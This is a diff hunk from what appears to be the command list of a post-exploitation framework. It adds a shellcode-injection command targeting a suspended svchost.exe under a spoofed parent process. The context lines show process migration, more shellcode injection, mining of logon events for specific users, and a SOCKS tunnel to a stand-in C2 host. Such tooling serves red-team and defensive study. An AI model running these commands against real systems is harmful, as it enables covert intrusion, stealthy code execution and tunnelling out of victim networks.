@@ -403,6 +403,7 @@ migrate -procid 4444
 migrate -procpath c:\\windows\\system32\\searchprotocolhost.exe -suspended -RtlCreateUserThread
 migrate -procpath c:\\windows\\system32\\svchost.exe -suspended
 inject-shellcode -x86 -procid 5634 -parentId 1111
+inject-shellcode -x64 -parentId 1111 -procpath 'c:\windows\system32\svchost.exe' -suspended
 get-eventlog -newest 10000 -instanceid 4624 -logname security | select message -expandproperty message | select-string -pattern "user1|user2|user3"
 send-mailmessage -to "itdept@test.com" -from "user01 <user01@example.com>" -subject <> -smtpserver <> -attachment <>
 sharpsocks -uri http://www.c2.com:9090 -beacon 2000 -insecure
